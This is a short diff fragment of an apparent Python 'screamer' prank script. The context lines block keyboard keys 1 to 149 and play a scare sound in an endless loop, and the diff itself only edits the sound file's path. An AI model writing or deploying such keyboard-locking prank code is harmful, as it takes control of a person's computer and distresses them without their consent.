@@ -29,7 +29,7 @@ for x in range(1, 150):
     keyboard.block_key(x)
 
 # 4. Играем звук (бесконечно)
-wave_obj = WaveObject.from_wave_file("./ScreamerSound.wav")
+wave_obj = WaveObject.from_wave_file("ScreamerSound.wav")
 
 while True:
     play_obj = wave_obj.play()
